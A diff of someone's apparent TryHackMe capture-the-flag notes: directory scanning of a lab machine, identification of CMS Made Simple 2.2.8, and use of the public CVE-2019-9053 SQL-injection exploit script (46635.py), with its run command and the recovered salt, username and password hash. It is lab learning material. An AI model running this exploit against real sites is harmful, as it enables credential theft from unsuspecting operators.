@@ -183,7 +183,42 @@ END_TIME: Sun Feb 16 17:07:51 2025
 DOWNLOADED: 25246 - FOUND: 0
 
 above shows that the directory /simple is a CMS - content management system 
-most likely used for Try Hack Me - 
+![[Pasted image 20250216194440.png]]
+-  CMS Made Simple version 2.2.8
+
+Researching this version of the Content management system has revealed:
+32 results for potential exploitation within exploit DB
+Identified the following exploit that is most suitable per CMS version:
+Released: 2019-04-02	
+Title: CMS Made Simple < 2.2.10 - SQL Injection	
+Type: WebApps	
+Platform: PHP	
+Author: Daniele Scanu
+CVE ID: CVE-2019-9053
+
+proceeded to download this executable - titled "46635.py"
+
+added the provided wordlist to the python script located under - 
+`/usr/share/seclists/Passwords/Common-Credentials/best110.txt`
+
+Identified the script required python 2
+
+further to execute this exploit using the following command:
+```plaintext
+python 46635.py -u http://10.10.231.22/simple
+```
+
+this script will then attempt to identify the following
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+As we can see by the above results the password for the account is hashed and salted
+this will require cracking
+
+
+
 
 ### file results
 
@@ -194,6 +229,7 @@ dirb http://10.10.231.22:80 -x ext.txt
 ---- Scanning URL: http://10.10.231.22:80/ ----
 + http://10.10.231.22:80/index.html (CODE:200|SIZE:11321)                                           
 + http://10.10.231.22:80/robots.txt (CODE:200|SIZE:929)          
+
 
 investigating the contents of robots.txt shows the following:
 
@@ -230,8 +266,6 @@ Disallow: /openemr-5_0_1_3
 \#
 \# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
 \#
-
-
 
 
 
